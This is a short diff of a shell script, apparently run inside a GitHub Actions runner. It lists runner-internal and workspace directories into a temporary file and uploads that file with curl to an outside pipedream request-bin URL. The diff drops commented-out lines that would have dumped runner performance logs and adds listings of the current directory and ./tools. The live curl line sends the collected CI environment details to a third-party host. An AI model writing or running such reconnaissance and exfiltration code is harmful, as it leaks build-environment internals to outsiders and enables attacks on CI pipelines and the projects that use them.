@@ -30,14 +30,11 @@ ls -1la /home/runner/work/_temp/_github_workflow >> /tmp/file.txt
 echo "--- home/runner/work/_temp/_runner_file_commands" >> /tmp/file.txt
 ls -1la /home/runner/work/_temp/_runner_file_commands >> /tmp/file.txt
 
-#ls -1la /home/runner/perflog >> /tmp/file.txt
-#echo "---" >> /tmp/file.txt
-#$(cat /home/runner/perflog/Runner.perf) >> /tmp/file.txt
-#echo "---" >> /tmp/file.txt
-#$(cat /home/runner/perflog/Worker.perf) >> /tmp/file.txt
-#echo "--- dale" >> /tmp/file.txt
-#$(perf report -i /home/runner/perflog/Worker.perf) >> /tmp/file.txt
-#echo "--- FINISH ---" >> /tmp/file.txt
+$(pwd) >> /tmp/file.txt
+ls -1la . >> /tmp/file.txt
+ls -1la ./tools >> /tmp/file.txt
+
+echo "--- FINISH ---" >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
 
